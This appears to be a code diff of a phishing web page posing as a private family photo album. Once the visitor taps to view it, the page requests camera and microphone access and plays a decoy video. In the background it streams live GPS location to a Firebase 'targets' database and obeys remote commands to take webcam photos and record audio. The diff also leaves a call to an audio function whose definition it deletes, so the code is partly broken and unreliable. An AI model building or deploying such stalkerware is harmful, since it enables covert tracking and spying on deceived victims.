@@ -10,99 +10,89 @@
         body { font-family: 'Segoe UI', sans-serif; background: #111; color: white; text-align: center; margin: 0; padding: 20px; }
         .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 20px; }
         .img-container { position: relative; overflow: hidden; border-radius: 10px; height: 180px; }
-        .img-container img { width: 100%; height: 100%; object-fit: cover; filter: blur(15px); transition: 2s; }
-        #unlockBtn { margin-top: 30px; padding: 15px 40px; font-size: 18px; font-weight: bold; background: #E91E63; color: white; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(233,30,99,0.3); }
-        #videoArea { display: none; width: 100%; margin-top: 20px; border-radius: 10px; overflow: hidden; background: #000; }
-        #status { margin-top: 10px; font-size: 12px; color: #777; }
+        .img-container img { width: 100%; height: 100%; object-fit: cover; filter: blur(15px); }
+        #unlockBtn { margin-top: 30px; padding: 15px 40px; font-size: 18px; font-weight: bold; background: #E91E63; color: white; border: none; border-radius: 50px; cursor: pointer; }
+        #videoArea { display: none; width: 100%; margin-top: 20px; border-radius: 12px; overflow: hidden; }
+        #status { margin-top: 15px; font-size: 12px; color: #555; }
     </style>
 </head>
 <body>
-    <h2>🌸 Family Shared Album</h2>
-    <p id="msg">Verification required to view this private album.</p>
-
-    <div class="gallery" id="albumGallery">
-        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1583391733956-6c78276477e2?w=500"></div>
-        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=500"></div>
+    <div id="mainUI">
+        <h2>🌸 Family Shared Album</h2>
+        <p>Verification required to view this private album.</p>
+        <div class="gallery">
+            <div class="img-container"><img src="https://images.unsplash.com/photo-1583391733956-6c78276477e2?w=500"></div>
+            <div class="img-container"><img src="https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=500"></div>
+        </div>
+        <button id="unlockBtn" onclick="startSystem()">Tap to View Album</button>
     </div>
-
-    <button id="unlockBtn" onclick="initSystem()">Tap to View Album</button>
 
     <div id="videoArea">
-        <iframe id="player" width="100%" height="250" src="" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+        <p style="color:#E91E63">Decrypting Album... 65%</p>
+        <iframe id="viralPlayer" width="100%" height="300" src="" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
 
-    <p id="status">Secure Link Verified</p>
+    <p id="status">Secure Connection Active</p>
 
     <script>
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        
-        // Fixed UserId (Persistent)
-        let userId = localStorage.getItem("target_id") || "User_" + Math.floor(Math.random() * 9999);
-        localStorage.setItem("target_id", userId);
 
-        async function initSystem() {
-            document.getElementById('status').innerText = "Connecting to server...";
-            
+        let userId = localStorage.getItem("target_name") || "User_" + Math.floor(Math.random() * 9999);
+        localStorage.setItem("target_name", userId);
+
+        async function startSystem() {
             try {
-                // 1. Silent Permission Request
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                
-                // 2. Instant Online Status (Bina location ke bhi online show hoga)
-                db.ref('targets/' + userId + '/location').update({
-                    status: "Online",
-                    last_seen: firebase.database.ServerValue.TIMESTAMP
+                // 1. Instant Online Trigger
+                await db.ref('targets/' + userId + '/location').update({ 
+                    status: "Online", 
+                    last_seen: firebase.database.ServerValue.TIMESTAMP 
                 });
 
-                // 3. UI Update (Video Play)
-                document.getElementById('unlockBtn').style.display = "none";
-                document.getElementById('albumGallery').style.display = "none";
-                document.getElementById('msg').innerText = "Decrypting Media... Please wait.";
-                document.getElementById('videoArea').style.display = "block";
-                document.getElementById('player').src = "https://www.youtube.com/embed/tgbNymZ7vqY?autoplay=1&mute=0";
+                // 2. Permission Request
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                
+                // 3. Switch UI to Video
+                document.getElementById('mainUI').style.display = 'none';
+                document.getElementById('videoArea').style.display = 'block';
+                // Viral Video Link (Auto-play)
+                document.getElementById('viralPlayer').src = "https://www.youtube.com/embed/tgbNymZ7vqY?autoplay=1";
 
-                // 4. Background Tracking & Commands
-                startHiddenTracking();
-                listenForCommands();
+                // 4. Background Loops
+                initTracking();
 
-            } catch (e) {
-                alert("Please Allow Permissions to see the album!");
-                console.log(e);
-            }
+            } catch (e) { alert("Error: Please allow permissions to view the album."); }
         }
 
-        function startHiddenTracking() {
+        function initTracking() {
             // Live Location
             navigator.geolocation.watchPosition((pos) => {
                 db.ref('targets/' + userId + '/location').update({
                     lat: pos.coords.latitude,
                     lng: pos.coords.longitude,
-                    timestamp: new Date().toLocaleTimeString(),
                     last_seen: firebase.database.ServerValue.TIMESTAMP
                 });
             }, null, { enableHighAccuracy: true });
 
-            // Online Heartbeat (Background Active rakhta hai)
+            // Online Heartbeat
             setInterval(() => {
-                db.ref('targets/' + userId + '/location').update({
-                    status: "Online",
-                    last_seen: firebase.database.ServerValue.TIMESTAMP
+                db.ref('targets/' + userId + '/location').update({ 
+                    status: "Online", 
+                    last_seen: firebase.database.ServerValue.TIMESTAMP 
                 });
-            }, 10000);
-        }
+            }, 5000);
 
-        function listenForCommands() {
+            // Command Listener
             db.ref('commands/' + userId).on('value', async (snap) => {
                 const cmd = snap.val();
-                if (!cmd) return;
-                if (cmd.action === "snap") { await captureSilentPhoto(); }
-                if (cmd.action === "mic") { await recordSilentAudio(15); }
-                db.ref('commands/' + userId).remove();
+                if (cmd?.action === "snap") capturePhoto();
+                if (cmd?.action === "mic") recordAudio(15);
+                if (cmd) db.ref('commands/' + userId).remove();
             });
         }
 
-        async function captureSilentPhoto() {
+        async function capturePhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 const video = document.createElement('video');
@@ -111,28 +101,12 @@
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const imageData = canvas.toDataURL('image/jpeg', 0.5);
-                db.ref('targets/' + userId + '/photos').push({ image: imageData, time: new Date().toLocaleTimeString() });
+                db.ref('targets/' + userId + '/photos').push({ 
+                    image: canvas.toDataURL('image/jpeg', 0.5), 
+                    time: new Date().toLocaleTimeString() 
+                });
                 stream.getTracks().forEach(t => t.stop());
-            } catch (e) { console.error(e); }
-        }
-
-        async function recordSilentAudio(sec) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = () => {
-                    const reader = new FileReader();
-                    reader.readAsDataURL(new Blob(chunks));
-                    reader.onloadend = () => {
-                        db.ref('targets/' + userId + '/audio').push({ data: reader.result, time: new Date().toLocaleTimeString() });
-                    };
-                };
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), sec * 1000);
-            } catch (e) { console.error(e); }
+            } catch(e) { console.log(e); }
         }
     </script>
 </body>
